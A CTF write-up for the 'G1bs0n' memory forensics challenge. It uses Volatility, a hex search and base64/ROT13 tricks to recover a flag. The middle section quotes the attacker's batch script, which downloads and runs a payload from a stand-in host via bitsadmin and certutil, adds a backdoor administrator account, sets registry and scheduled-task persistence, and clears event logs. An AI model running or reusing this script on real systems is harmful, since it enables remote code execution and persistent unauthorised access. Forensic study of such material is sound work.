# G1bs0n - Misc - 300 points

> Agent Gill called, we have until tomorrow at 15:00 UTC to fix some virus problem.
>
> Solves: 23
>
> Download: http://dl.ctf.rocks/G1bs0n.tar.gz
>
> Author: d3vnu11

We are given a memory dump of a system, and we need to "fix" the virus problem. Image seems to be taken via VirtualBox. We downloaded [Volatility](http://www.volatilityfoundation.org/), and started to study the image, first using the `imageinfo` command to identify the image profile:

    > volatility_2.6_win64_standalone.exe -f G1bs0n imageinfo
    Volatility Foundation Volatility Framework 2.6
    INFO    : volatility.debug    : Determining profile based on KDBG search...
              Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                         AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                         AS Layer2 : VMWareAddressSpace (Unnamed AS)
                         AS Layer3 : FileAddressSpace (C:\G1bs0n\G1bs0n)
                          PAE type : No PAE
                               DTB : 0x187000L
                              KDBG : 0xf8000284f0a0L
              Number of Processors : 1
         Image Type (Service Pack) : 1
                    KPCR for CPU 0 : 0xfffff80002850d00L
                 KUSER_SHARED_DATA : 0xfffff78000000000L
               Image date and time : 2017-09-03 10:33:21 UTC+0000
         Image local date and time : 2017-09-03 12:33:21 +0200
         
So let's use the Win7SP1x64 profile. We tried various commands without finding much of interest, but `psxview` showed that some cmd and powershell processes had recently ran.

    > volatility_2.6_win64_standalone.exe -f G1bs0n --profile=Win7SP1x64 psxview
    Volatility Foundation Volatility Framework 2.6
    Offset(P)          Name                    PID pslist psscan thrdproc pspcid csrss session deskthrd ExitTime
    ------------------ -------------------- ------ ------ ------ -------- ------ ----- ------- -------- --------
    0x000000003e340300 lsm.exe                 496 True   True   True     True   True  True    True
    0x0000000024bb57c0 winlogon.exe           1244 True   True   True     True   True  True    True
    0x000000003e10e740 svchost.exe             292 True   True   True     True   True  True    True
    0x000000003efe3890 winlogon.exe            420 True   True   True     True   True  True    False
    0x000000003eb66b30 sppsvc.exe             2552 True   True   True     True   True  True    True
    0x000000003e107b30 spoolsv.exe             240 True   True   True     True   True  True    True
    0x000000003ebaf770 svchost.exe            2596 True   True   True     True   True  True    False
    0x000000003de04790 rdpclip.exe            2844 True   True   True     True   True  True    True
    0x000000003f3c9b30 dwm.exe                1704 True   True   True     True   True  True    True
    0x000000003e298910 wininit.exe             384 True   True   True     True   True  True    True
    0x000000003e3be130 svchost.exe             596 True   True   True     True   True  True    True
    0x000000003e3e9b30 svchost.exe             664 True   True   True     True   True  True    True
    0x000000003e0443c0 LogonUI.exe             752 True   True   True     True   True  True    False
    0x000000003f6cc3e0 taskeng.exe            2612 True   True   True     True   True  True    True
    0x000000003e031b30 svchost.exe             764 True   True   True     True   True  True    True
    0x000000003f783060 iexplore.exe           2852 True   True   True     True   True  True    True
    0x000000003ed40060 iexplore.exe           2512 True   True   True     True   True  True    True
    0x000000003ea52670 svchost.exe            2128 True   True   True     True   True  True    True
    0x000000003e2b8b30 lsass.exe               488 True   True   True     True   True  True    False
    0x000000003f621060 taskhost.exe           2488 True   True   True     True   True  True    True
    0x000000003e1eb310 svchost.exe            1044 True   True   True     True   True  True    True
    0x000000003e05bb30 svchost.exe             836 True   True   True     True   True  True    True
    0x000000003fc5fb30 explorer.exe            848 True   True   True     True   True  True    True
    0x000000003e33ba70 services.exe            480 True   True   True     True   True  True    False
    0x000000003ef9c290 SearchIndexer.         1724 True   True   True     True   True  True    True
    0x000000003e060b30 svchost.exe             808 True   True   True     True   True  True    True
    0x000000003e088b30 svchost.exe             968 True   True   True     True   True  True    True
    0x000000003ffc1b30 csrss.exe               392 True   True   True     True   False True    False
    0x000000003e257060 csrss.exe               348 True   True   True     True   False True    True
    0x000000003ffbdae0 System                    4 True   True   True     True   False False   False
    0x000000003f1d8300 smss.exe                260 True   True   True     True   False False   False
    0x000000003f777b30 csrss.exe              1248 True   True   True     True   False True    True
    0x000000003ea26b30 regedit.exe            2812 False  True   False    False  False False   False    2017-09-03 10:28:17 UTC+0000
    0x000000003ed6c060 cmd.exe                 796 False  True   False    False  False False   False    2017-09-03 10:33:01 UTC+0000
    0x000000003ea42b30 SearchProtocol         2060 False  True   False    False  False False   False    2017-08-30 07:45:22 UTC+0000
    0x000000003f6d8b30 taskhost.exe           1772 False  True   False    False  False False   False    2017-09-03 10:27:19 UTC+0000
    0x000000003dd8fb30 powershell.exe         1596 False  True   False    False  False False   False    2017-09-03 10:33:01 UTC+0000
    0x000000003ed36060 net.exe                2792 False  True   False    False  False False   False    2017-09-03 10:28:12 UTC+0000
    0x000000003f7d1b30 cmd.exe                2064 False  True   False    False  False False   False    2017-09-03 10:28:17 UTC+0000
    0x000000003f7041e0 net.exe                1088 False  True   False    False  False False   False    2017-09-03 10:28:17 UTC+0000
    
Frustrated with not finding anything, we started to just browse the file with a hex editor, and stumbled upon the name `acidburn`. Suspicious! We searched for `acidburn` in the file, and quickly found an...interesting snippet of code:

    REM "It's cool, I'm just looking."
    mkdir C:\T3MP
    cd C:\T3MP
    bitsadmin  /transfer Nothing /download  /priority normal http://l0calh0st.com/gibson.jpg  C:\T3MP\gibson.jpg
    certutil -decode gibson.jpg gibson.zip >nul
    echo Get^-ChildItem ^-Path "C:\T3MP" ^-Filter ^*.zip ^| Expand-Archive ^-DestinationPath "C:\T3MP" ^-Force > C:\T3MP\z.ps1
    cmd /c "powershell -NOP -EP Bypass C:\T3MP\z.ps1"
    net user acidburn
    IF %ERRORLEVEL% NEQ 0 (
        echo LOL, I win
    ) ELSE (
    	REM Remove LOL
    	net user acidburn /active:no
        net localgroup administrators acidburn /del
    )
    REM Hack The Planet
    net user /add zerocool
    net user zerocool *
    net localgroup administrators zerocool /add
    REM add Run key
    cmd /c "regedit /s c:\T3MP\run.reg"
    del run.reg
    del gibson.zip
    del z.zip
    schtasks /create /sc minute /mo 5 /tn "NothingSpecial" /tr C:\T3MP\run.bat /RL HIGHEST
    REM "If I win, you become my slave."

Sadly, `l0calh0st.com` doesn't work, so we can't get the original file from the server. But is there another way to locate it? We see that the hacker uses `certutil` to base64 decode the file into a ZIP file. We know a ZIP file always starts with `PK\x03\x04`, so we try searching the memory dump for that string. We find it multiple times, but sadly nothing that seems related to the hacker script.

There is another option, though. `PK\x03` is `UEsD` in base64, so we search for it - and get a match! We base64 decode the full string we found, and get the file used, `gibson.zip`. It contains three files, `run.bat` which is a single line script that spawns Powershell, `run.ps1` which displays an ASCII art logo then clears the Powershell event log, and `run.reg` which adds some registry keys for persistence and backdooring.

And there, at the bottom of the registry file:

    [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\Security]
    "Special"="}JGS_3G4X_GH0_3Z"

Well, that certainly *looks* like a flag, or possibly part of it. But what does it mean? Just submitting it doesn't work. The `}` at the end might mean it's reversed, but `Z3_0HG_X4G3_SGJ}` doesn't make much more sense either. Maybe it's a key to some program that's elsewhere in memory?

After a while of searching without results for something that uses the "Special" value, we get a wild idea and try [ROT13](https://en.wikipedia.org/wiki/ROT13) on the special string - and get `M3_0UT_K4T3_FTW}`!! That *definitely* looks like a flag, but only part of it. After some thinking, we realize that we need to search for `SECT{` in memory, but yet again reversed and ROT13'd, so we search for `{GPRF`, and quickly find the string `_X43EUC_3H64YC{GPRF`.

We combine the two strings, reverse them, ROT13 them, and we finally have the full flag: `SECT{PL46U3_PHR34K_M3_0UT_K4T3_FTW}`
